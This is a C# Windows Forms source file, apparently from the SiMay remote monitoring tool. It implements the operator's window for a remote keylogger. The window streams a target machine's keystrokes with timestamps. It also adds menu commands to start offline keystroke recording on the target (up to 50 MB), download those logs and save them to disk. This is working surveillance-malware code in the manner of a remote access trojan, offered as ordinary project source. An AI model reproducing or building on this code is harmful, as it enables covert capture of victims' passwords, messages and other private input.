using SiMay.Basic;
using SiMay.RemoteControls.Core;
using SiMay.RemoteMonitor.Attributes;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using static SiMay.RemoteMonitor.Win32Api;

namespace SiMay.RemoteMonitor.Application
{
    [OnTools]
    [Rank(40)]
    [ApplicationName("输入记录")]
    [AppResourceName("KeyboradManager")]
    public partial class KeyboardApplication : Form, IApplication
    {
        private const Int32 IDM_START_OFFLINE_RECORD = 1000;
        private const Int32 IDM_DOWNLOAD_OFFLINE = 1001;
        private const Int32 IDM_CLEAR = 1002;
        private const Int32 IDM_SAVE = 1003;

        [ApplicationAdapterHandler]
        public KeyboardAdapterHandler KeyboardAdapterHandler { get; set; }

        private string _title = "//远程输入记录 #Name#";
        public KeyboardApplication()
        {
            InitializeComponent();
        }

        public void Start()
        {
            this.Show();
        }

        public void SetParameter(object arg)
        {
            throw new NotImplementedException();
        }

        public void SessionClose(ApplicationBaseAdapterHandler handler)
        {
            this.Text = _title + " [" + this.KeyboardAdapterHandler.State.ToString() + "]";
        }

        public void ContinueTask(ApplicationBaseAdapterHandler handler)
        {
            this.Text = _title;
        }

        private void KeyboardForm_Load(object sender, EventArgs e)
        {
            this.Text = this._title = this._title.Replace("#Name#", this.KeyboardAdapterHandler.OriginName);

            IntPtr sysMenuHandle = GetSystemMenu(this.Handle, false);

            InsertMenu(sysMenuHandle, 7, MF_SEPARATOR, 0, null);
            InsertMenu(sysMenuHandle, 8, MF_BYPOSITION, IDM_START_OFFLINE_RECORD, "开始离线记录");
            InsertMenu(sysMenuHandle, 9, MF_BYPOSITION, IDM_DOWNLOAD_OFFLINE, "下载离线记录");
            InsertMenu(sysMenuHandle, 10, MF_BYPOSITION, IDM_CLEAR, "清空记录");
            InsertMenu(sysMenuHandle, 11, MF_BYPOSITION, IDM_SAVE, "保存记录");

            this.KeyboardAdapterHandler.OnKeyboardDataEventHandler += OnKeyboardDataEventHandler;
            this.KeyboardAdapterHandler.OnOffLineKeyboradEventHandler += OnOffLineKeyboradEventHandler;
            this.KeyboardAdapterHandler.StartGetKeyorad();
        }

        private void OnOffLineKeyboradEventHandler(KeyboardAdapterHandler adapterHandler, string text)
        {
            txtKey.Text = text;
            MessageBoxHelper.ShowBoxExclamation("离线记录已停止!");
        }

        private void OnKeyboardDataEventHandler(KeyboardAdapterHandler adapterHandler, string text)
        {
            txtKey.AppendText(DateTime.Now.ToString() + Environment.NewLine);
            txtKey.AppendText(text + Environment.NewLine);
        }

        protected override void WndProc(ref Message m)
        {

            if (m.Msg == WM_SYSCOMMAND)
            {
                IntPtr sysMenuHandle = GetSystemMenu(m.HWnd, false);
                switch (m.WParam.ToInt64())
                {
                    case IDM_START_OFFLINE_RECORD:
                        this.KeyboardAdapterHandler.StartOffLineKeyboard();

                        MessageBoxHelper.ShowBoxExclamation("离线记录已开始,最大保存50M离线记录!");
                        break;
                    case IDM_DOWNLOAD_OFFLINE:
                        this.KeyboardAdapterHandler.GetOffLineKeyboardData();

                        break;
                    case IDM_CLEAR:
                        txtKey.Text = "";
                        break;
                    case IDM_SAVE:
                        string savaPath = Path.Combine(Environment.CurrentDirectory, "download");

                        if (!Directory.Exists(savaPath))
                            Directory.CreateDirectory(savaPath);

                        string fileName = Path.Combine(savaPath, DateTime.Now.ToFileTime() + " 输入记录离线文件.txt");
                        StreamWriter fs = new StreamWriter(fileName, true);
                        fs.WriteLine(txtKey.Text);
                        fs.Close();
                        MessageBoxHelper.ShowBoxExclamation("离线记录文件已保存到:" + fileName);
                        break;
                }
            }
            base.WndProc(ref m);
        }
        private void KeyboardForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.KeyboardAdapterHandler.OnKeyboardDataEventHandler -= OnKeyboardDataEventHandler;
            this.KeyboardAdapterHandler.OnOffLineKeyboradEventHandler -= OnOffLineKeyboradEventHandler;
            this.KeyboardAdapterHandler.CloseSession();
        }
    }
}